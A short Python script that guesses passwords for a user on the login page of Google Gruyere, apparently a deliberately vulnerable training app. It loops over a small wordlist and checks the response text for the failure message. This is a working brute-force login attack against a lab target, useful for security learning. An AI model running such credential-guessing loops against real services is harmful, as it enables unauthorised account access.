import requests

session_id = '372024854800729218315573898331817432705'
url_base = 'http://google-gruyere.appspot.com/{}/{}'
sign_in_page = 'login'

# bad part of our script but probably okay since these aren't our
username = 'test'
passwords_to_try = ['password', 'not_the_password', 'test']

session = requests.session()

for password in passwords_to_try:
    login_url = url_base.format(session_id, sign_in_page)
    login_url += '?uid={}&pw={}'.format(username, password)

    print('trying password: ' + password + " .....", end = ' ')
    result = session.get(login_url)

    if result.status_code == requests.codes.ok:
        # well unfortunately a login failure retuns OK too
        if "Invalid user name or password." in result.text:
            print('FAILED!!!')
        else:
            print('We found the password - ', password)
    else:
        print(result.status_code)
